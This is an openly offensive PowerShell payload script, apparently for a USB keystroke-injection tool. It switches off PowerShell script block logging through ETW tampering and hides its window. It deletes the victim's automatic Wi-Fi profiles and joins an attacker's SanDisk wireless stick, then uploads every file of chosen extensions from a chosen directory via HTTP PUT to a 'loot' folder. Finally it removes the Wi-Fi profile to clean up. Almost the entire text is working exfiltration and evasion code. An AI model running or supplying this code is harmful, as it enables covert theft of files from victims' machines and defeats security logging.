#
# Author:       TW-D
# Version:      1.0
#

param (
    [string] $SSID,
    [string] $PSK,
    [string] $LOOT,
	[string] $DIRECTORY,
	[string] $EXTENSION
)

# Avoids "PowerShell Script Block Logging".
#
$etw_provider = [Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider", "NonPublic,Static")
$event_provider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$etw_provider.SetValue($null, $event_provider)

# Hide "PowerShell" window.
#
$Script:showWindowAsync = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$showWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null

If ($SSID -And $PSK -And $LOOT -And $DIRECTORY -And $EXTENSION) {

    # Deletes Wi-Fi connection profiles in automatic mode, each deletion causes a disconnection.
    # 
    $interface_guid = (Get-NetAdapter -Physical -Name "Wi-Fi" | WHERE Status -eq "Up").InterfaceGuid
    If ($interface_guid) {
        $wlan_service_path = "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\${interface_guid}\"
        $wlan_service_items = Get-ChildItem -Path $wlan_service_path -Recurse
        $wlan_service_items | ForEach-Object {
            [xml] $xml_content = Get-Content -Path $_.FullName
            $mode = $xml_content.WLANProfile.connectionMode
            $name = $xml_content.WLANProfile.name
            If ($mode -eq "auto") {
                (NETSH WLAN DELETE PROFILE name="$name") | Out-Null
            }
        }
    }

    # Adds the profile for the "SanDisk Connect Wireless Stick" in automatic mode.
    #
    $profile_guid = "{" + [guid]::NewGuid().ToString() + "}"
    $profile_path = "${env:TEMP}\${profile_guid}.xml"
    $ssid_hex = ($SSID.ToCharArray() | ForEach-Object { [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($_)) })
@"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>${SSID}</name>
	<SSIDConfig>
		<SSID>
			<hex>${ssid_hex}</hex>
			<name>${SSID}</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>${PSK}</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
	<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
		<enableRandomization>false</enableRandomization>
	</MacRandomization>
</WLANProfile>
"@ | Out-File -FilePath "${profile_path}"

    (NETSH WLAN ADD PROFILE filename="${profile_path}") | Out-Null
    Remove-Item -Path "${profile_path}" -Force

	# Checks whether the Wi-Fi interface is connected to the "SanDisk".
	# Whether the gateway can be reached.
	# If not, automatically starts again.
	#
	While ($TRUE) {
		$ConnectionError = $NULL
		Try {
			(NETSH WLAN CONNECT name="$SSID") | Out-Null
			$wifi_connected = (Get-NetConnectionProfile).Name
			$gateway_address = (Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Select-Object -ExpandProperty NextHop)
			$gateway_reachable = (Test-Connection -ComputerName $gateway_address -Quiet)
			If ($wifi_connected -eq $SSID -And $gateway_reachable) {
				Break
			}
		} Catch {
			$ConnectionError = $_
			Start-Sleep -Seconds 8
		}
	}

	#
	# Exfiltration of the files via the HTTP channel.
	#

	Function Invoke-CustomRequest($Url, $Method) {
		$RequestError = $NULL
		Try {
			$request = [System.Net.WebRequest]::Create($Url)
			$request.Method = $Method
			$request.GetResponse().Close()
		} Catch {
			$RequestError = $_
			return $FALSE
		}
		return $TRUE
	}

	Function Invoke-UploadRequest($Url, $File) {
		$RestError = $NULL
		Try {
			$empty = [String]::IsNullOrWhiteSpace((Get-Content -Path $File))
			If (!$empty) {
				Invoke-RestMethod -Uri $Url -Method PUT -InFile $File
			}
		} Catch {
			$RestError = $_
		}
	}

	Function Exfiltration-Files($Directory, $Extension, $Url) {
		$files = Get-ChildItem -Path $Directory -Include ($Extension.split(",")) -Recurse
		ForEach ($file in $files) {
			$random = ( -join ( (0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8  | % {[char]$_} ) )
			$basename = Split-Path -Path "${file}" -Leaf -Resolve
			Invoke-UploadRequest -Url "${Url}${random}-${basename}" -File "${file}" | Out-Null
		}
	}

	$sandisk_loot = "http://${gateway_address}/myconnect/${LOOT}/"
	
	$check_loot = Invoke-CustomRequest -Url $sandisk_loot -Method "GET"
	If ($check_loot) {
		Exfiltration-Files -Directory $DIRECTORY -Extension $EXTENSION -Url $sandisk_loot
	} Else {
		Invoke-CustomRequest -Url $sandisk_loot -Method "MKCOL" | Out-Null
		Exfiltration-Files -Directory $DIRECTORY -Extension $EXTENSION -Url $sandisk_loot
	}

	# Cleanup
	#
	(NETSH WLAN DELETE PROFILE name="$SSID") | Out-Null
	Exit

}